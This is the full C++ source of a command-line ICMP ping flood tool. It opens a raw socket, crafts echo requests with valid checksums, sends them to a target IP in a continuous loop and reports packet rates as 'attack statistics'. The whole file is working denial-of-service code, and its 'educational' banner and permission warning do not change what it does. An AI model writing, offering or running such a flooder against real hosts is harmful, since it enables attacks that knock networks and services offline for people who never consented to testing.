#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <chrono>
#include <signal.h>
#include <iomanip>
#include <errno.h>

// Global variables for statistics
volatile bool running = true;
unsigned int packet_count = 0;
auto start_time = std::chrono::high_resolution_clock::now();

// Signal handler for graceful exit
void signal_handler(int sig) {
    running = false;
    auto end_time = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::seconds>(end_time - start_time);
    
    std::cout << "\n\n=== ATTACK STATISTICS ===\n";
    std::cout << "Total packets sent: " << packet_count << "\n";
    std::cout << "Duration: " << duration.count() << " seconds\n";
    if (duration.count() > 0) {
        std::cout << "Average rate: " << packet_count / duration.count() << " packets/sec\n";
    }
    std::cout << "Attack terminated.\n";
    exit(0);
}

// Calculate ICMP checksum
unsigned short checksum(void *b, int len) {
    unsigned short *buf = (unsigned short *)b;
    unsigned int sum = 0;
    unsigned short result;

    for (; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;

    // Fold 32-bit sum to 16 bits
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        std::cerr << "Educational ICMP Ping Flood Tool\n";
        std::cerr << "Usage: sudo " << argv[0] << " <target_ip>\n";
        std::cerr << "WARNING: Only use on systems you own or have permission to test!\n";
        return 1;
    }

    const char *target_ip = argv[1];

    // Set up signal handler for Ctrl+C
    signal(SIGINT, signal_handler);

    std::cout << "=== EDUCATIONAL ICMP PING FLOOD TOOL ===\n";
    std::cout << "Target: " << target_ip << "\n";
    std::cout << "Press Ctrl+C to stop and see statistics\n";
    std::cout << "WARNING: This is a demonstration tool for educational purposes only!\n\n";

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        perror("Socket creation failed. Are you running as root?");
        return 1;
    }

    struct sockaddr_in dest{};
    dest.sin_family = AF_INET;
    if (inet_pton(AF_INET, target_ip, &dest.sin_addr) <= 0) {
        std::cerr << "Invalid IP address: " << target_ip << "\n";
        return 1;
    }

    const int payload_size = 56;
    const int packet_size = sizeof(struct icmphdr) + payload_size;
    char packet[packet_size];

    start_time = std::chrono::high_resolution_clock::now();

    std::cout << "[*] Starting ICMP flood to " << target_ip << "\n";

    while (running) {
        memset(packet, 0, sizeof(packet));

        struct icmphdr *icmp_hdr = (struct icmphdr *)packet;

        // Fill payload with pattern (e.g., 'B')
        memset(packet + sizeof(struct icmphdr), 0x42, payload_size);

        icmp_hdr->type = ICMP_ECHO;
        icmp_hdr->code = 0;
        icmp_hdr->un.echo.id = htons(1234);
        icmp_hdr->un.echo.sequence = htons(packet_count & 0xFFFF);  // wrap sequence number in 16-bit
        icmp_hdr->checksum = 0;
        icmp_hdr->checksum = checksum(packet, packet_size);

        ssize_t sent = sendto(sock, packet, packet_size, 0, (struct sockaddr *)&dest, sizeof(dest));
        if (sent < 0) {
            if (errno == ENOBUFS) {
                std::cout << "\nBuffer overflow detected - slowing down...\n";
                usleep(10000);  // 10 ms delay
                continue;
            } else {
                perror("sendto");
                break;
            }
        }

        packet_count++;

        // Display progress every 1000 packets
        if (packet_count % 1000 == 0) {
            auto current_time = std::chrono::high_resolution_clock::now();
            auto duration = std::chrono::duration_cast<std::chrono::seconds>(current_time - start_time);
            if (duration.count() > 0) {
                std::cout << "Sent " << packet_count << " packets (" 
                          << packet_count / duration.count() << " pkt/s)\r" << std::flush;
            }
        }

        // Small delay to prevent overwhelming the network stack too much (adjust as needed)
        usleep(100);
    }

    close(sock);
    signal_handler(SIGINT);  // print final stats if loop ends naturally

    return 0;
}
